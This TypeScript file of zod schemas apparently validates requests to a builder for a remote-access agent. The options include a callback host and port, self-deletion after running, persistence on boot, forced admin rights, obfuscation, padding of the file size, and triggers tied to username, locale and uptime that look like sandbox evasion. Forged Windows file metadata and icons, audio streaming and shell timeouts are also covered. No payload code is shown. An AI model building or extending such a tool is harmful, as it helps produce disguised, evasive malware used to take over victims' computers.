import { z } from 'zod';
import { agentModuleIds } from '../../../../shared/modules/index.js';
import {
	TARGET_OS_VALUES,
	type BuildRequest,
	type BuildResponse
} from '../../../../shared/types/build';

const numericString = z.union([z.string(), z.number()]);

const customHeaderSchema = z
	.object({
		key: z.string(),
		value: z.string()
	})
	.strict();

const customCookieSchema = z
	.object({
		name: z.string(),
		value: z.string()
	})
	.strict();

const watchdogSchema = z
	.object({
		enabled: z.boolean(),
		intervalSeconds: z.number().int().positive()
	})
	.strict();

const filePumperSchema = z
	.object({
		enabled: z.boolean(),
		targetBytes: z.number().int().positive()
	})
	.strict();

const executionTriggersSchema = z
	.object({
		delaySeconds: z.number().int().nonnegative().optional(),
		minUptimeMinutes: z.number().int().nonnegative().optional(),
		allowedUsernames: z.array(z.string()).optional(),
		allowedLocales: z.array(z.string()).optional(),
		requireInternet: z.boolean().optional(),
		startTime: z.string().optional(),
		endTime: z.string().optional()
	})
	.strict();

const audioOptionsSchema = z
	.object({
		streaming: z.boolean().optional()
	})
	.strict();

const fileIconSchema = z
	.object({
		name: z.string().optional().nullable(),
		data: z.string()
	})
	.strict();

const windowsFileInformationSchema = z
	.object({
		fileDescription: z.string().optional(),
		productName: z.string().optional(),
		companyName: z.string().optional(),
		productVersion: z.string().optional(),
		fileVersion: z.string().optional(),
		originalFilename: z.string().optional(),
		internalName: z.string().optional(),
		legalCopyright: z.string().optional()
	})
	.strict();

const moduleIdSchema = z.string().refine((value) => agentModuleIds.has(value), {
	message: 'Invalid module selection'
});

export const buildRequestSchema = z
	.object({
		host: z.union([z.string(), z.number()]),
		port: numericString.optional(),
		outputFilename: z.string().optional(),
		outputExtension: z.string().optional(),
		targetOS: z.enum(TARGET_OS_VALUES).optional(),
		targetArch: z.enum(['amd64', '386', 'arm64']).optional(),
		installationPath: z.string().optional(),
		meltAfterRun: z.boolean().optional(),
		startupOnBoot: z.boolean().optional(),
		developerMode: z.boolean().optional(),
		mutexName: z.string().optional(),
		compressBinary: z.boolean().optional(),
		obfuscateBinary: z.boolean().optional(),
		forceAdmin: z.boolean().optional(),
		pollIntervalMs: numericString.optional(),
		maxBackoffMs: numericString.optional(),
		shellTimeoutSeconds: numericString.optional(),
		watchdog: watchdogSchema.optional(),
		filePumper: filePumperSchema.optional(),
		executionTriggers: executionTriggersSchema.optional(),
		customHeaders: z.array(customHeaderSchema).optional(),
		customCookies: z.array(customCookieSchema).optional(),
		audio: audioOptionsSchema.optional(),
		fileIcon: fileIconSchema.optional(),
		fileInformation: windowsFileInformationSchema.optional(),
		modules: z.array(moduleIdSchema).optional()
	})
	.strict() satisfies z.ZodType<BuildRequest>;

export const buildResponseSchema = z
	.object({
		success: z.boolean(),
		message: z.string(),
		outputPath: z.string().optional(),
		downloadUrl: z.string().optional(),
		log: z.array(z.string()).optional(),
		sharedSecret: z.string().optional(),
		warnings: z.array(z.string()).optional()
	})
	.strict() satisfies z.ZodType<BuildResponse>;

export type BuildRequestSchema = typeof buildRequestSchema;
export type BuildResponseSchema = typeof buildResponseSchema;
